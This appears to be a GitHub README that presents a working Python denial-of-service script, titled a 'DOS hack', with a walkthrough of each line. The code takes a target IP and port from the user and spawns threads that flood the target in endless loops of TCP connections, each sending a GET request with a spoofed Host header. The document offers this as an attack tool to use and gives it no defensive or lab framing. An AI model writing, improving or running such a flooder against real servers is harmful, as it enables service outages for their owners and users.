# DDOS-harshaD3

![Cool Typography Boo Halloween Store Logo](https://github.com/Harshavardhanraju99/DDOS-harshaD3/assets/160013343/590fba29-1f58-45de-9ebc-4e8b603d14f0)

# DOS hack python script ...........!

*import socket
*import threading

-->These lines import necessary modules from Python's standard library. socket is used for creating network sockets, and threading is used for creating and managing threads.

target = input("Insert target’s IP: ")
port = int(input("Insert Port: "))
num_threads = int(input("Insert number of Threads: "))

-->These lines prompt the user to input the IP address of the target server, the port number to attack, and the number of threads (connections) to create for the attack. The input() function is used to take input from the user, and int() is used to convert the input to integers where necessary.

![image](https://github.com/Harshavardhanraju99/DDOS-harshaD3/assets/160013343/36e370c6-71f7-4174-afa5-e90ac4d8edac)

fake_ip = '44.197.175.168'
attack_num = 0

-->Here, fake_ip is assigned a dummy IP address which will be used in the forged HTTP request header. attack_num is initialized to keep track of the number of requests sent during the attack.

def attack():
    global attack_num
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(f"GET /{target} HTTP/1.1\r\n".encode('utf-8'))
            s.send(f"Host: {fake_ip}\r\n\r\n".encode('utf-8'))
            s.close()
            attack_num += 1
            print(f"Attack number: {attack_num}")
        except Exception as e:
            print(f"Error: {e}")
            
-->This function attack() is defined to simulate the DoS attack. It continuously tries to establish a connection to the target server using TCP/IP sockets (socket.socket()), sends a fake HTTP GET request with a forged IP address in the header, increments the attack_num counter, and prints the number of attacks. If an exception occurs during the attack, it prints the error message.


threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    threads.append(thread)
    
-->These lines create a list threads to store the threads created for the attack. It then creates the specified number of threads (num_threads) by looping through and calling the attack() function as the target for each thread. Each thread is started (thread.start()) and added to the threads list.
for thread in threads:
    thread.join()
    
-->Finally, this loop waits for all threads to finish executing (thread.join()). It ensures that the main program waits for all threads to complete before it terminates.



Importing Libraries:

python
Copy code
import socket
import threading
